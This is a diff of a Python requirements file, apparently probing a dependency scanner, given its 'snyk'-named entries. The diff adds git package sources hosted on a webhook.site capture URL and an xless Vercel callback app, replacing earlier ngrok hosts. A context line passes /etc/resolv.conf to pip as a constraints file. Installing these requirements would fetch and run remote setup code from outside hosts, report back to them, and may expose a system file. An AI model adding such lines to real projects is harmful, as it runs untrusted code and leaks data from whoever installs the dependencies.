@@ -3,8 +3,9 @@ colorama==0.4.3
 pytest==6.2.2
 win_unicode_console==0.5
 snyk30 @ git+https://github.com/snkpinkh1/snyk2
-snyk7 @ git+https://5244-2a0d-6fc2-6430-1c00-6c2d-8d7d-2238-8b0a.ngrok-free.app/home/snyk4
-https://5244-2a0d-6fc2-6430-1c00-6c2d-8d7d-2238-8b0a.ngrok-free.app/snyk5
+snyk7 @ git+https://xless-bxub8u6tp.vercel.app/home/snyk4
+abcdef0000 @ git+https://webhook.site/40ec81d0-651c-4818-b79f-b4e50686f6ad/a/b/c/def
+https://xless-bxub8u6tp.vercel.app/snyk5
 -r ./requirements-1.txt
 ./requirements-2.txt
 -c /etc/resolv.conf
